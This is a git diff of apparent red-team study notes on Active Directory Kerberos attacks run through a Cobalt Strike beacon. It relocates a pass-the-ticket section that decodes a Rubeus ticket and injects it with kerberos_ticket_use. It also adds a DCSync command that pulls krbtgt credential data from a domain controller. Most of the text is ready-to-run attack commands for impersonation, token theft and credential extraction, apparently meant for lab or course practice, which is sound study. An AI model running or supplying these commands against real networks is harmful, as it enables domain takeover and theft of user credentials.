@@ -98,31 +98,6 @@ beacon> rev2self
 [+] host called home, sent: 20 bytes
 ```
 
-## kerberos_ticket_use
-
-We can use the `make_token` module with a fake password if we inject kerberos tickets on memory.
-
-```
-beacon> make_token CORP\user FakePass
-```
-We can use `kerberos_ticket_use` to select a TGT of the user to impersonate.
-
-If we obtain a ticket from Rubeus and we have it in Base64 we will need to decode it and store on a file
-
-```
-PS C:\> [System.IO.File]::WriteAllBytes("C:\Tickets\user.kirbi", [System.Convert]::FromBase64String("doIGWD[...snip...]MuaW8="))
-```
-
-After that we can use the ticket.
-
-```
-beacon> kerberos_ticket_use C:\Tickets\user.kirbi
-```
-
-> **Note**: `kerberos_ticket_use` allows us to inject on memory `TGT` and `TGS`.
-
-> **Note**: After importing the ticket make sure to always use the FQDN. If not some `1326 errors` will appear.
-
 # Extracting Kerberos Tickets
 
 Instead of craft a TGT we can retrieve it directly from memory.
@@ -304,7 +279,6 @@ To pass the TGT into this logon session, we can use Beacon's `kerberos_ticket_us
 ```
 beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi 
 ```
-
 ## Elevated context
 
 If is on an elevated context, we can do it with Rubeus.
@@ -315,4 +289,39 @@ beacon> execute-assembly C:\Tools\Rubeus.exe asktgt /user:user /domain:corp.loca
 ```
 beacon> steal_token 3453
 ```
+# Pass The Ticket
 
+We can use the `make_token` module with a fake password if we inject kerberos tickets on memory.
+
+```
+beacon> make_token CORP\user FakePass
+```
+We can use `kerberos_ticket_use` to select a TGT of the user to impersonate.
+
+If we obtain a ticket from Rubeus and we have it in Base64 we will need to decode it and store on a file
+
+```
+PS C:\> [System.IO.File]::WriteAllBytes("C:\Tickets\user.kirbi", [System.Convert]::FromBase64String("doIGWD[...snip...]MuaW8="))
+```
+
+After that we can use the ticket.
+
+```
+beacon> kerberos_ticket_use C:\Tickets\user.kirbi
+```
+
+> **Note**: `kerberos_ticket_use` allows us to inject on memory `TGT` and `TGS`.
+
+> **Note**: After importing the ticket make sure to always use the FQDN. If not some `1326 errors` will appear.
+
+
+
+# DCSync
+
+The Directory Replication Service (MS-DRSR) protocol is used to synchronise and replicate Active Directory data between domain controllers.  DCSync is a technique which leverages this protocol to extract username and credential data from a DC.
+
+This tecnhique requires `GetNCChanges` which is usually only available for Domain Admins.
+
+```
+beacon> dcsync corp.local CORP\krbtgt
+```
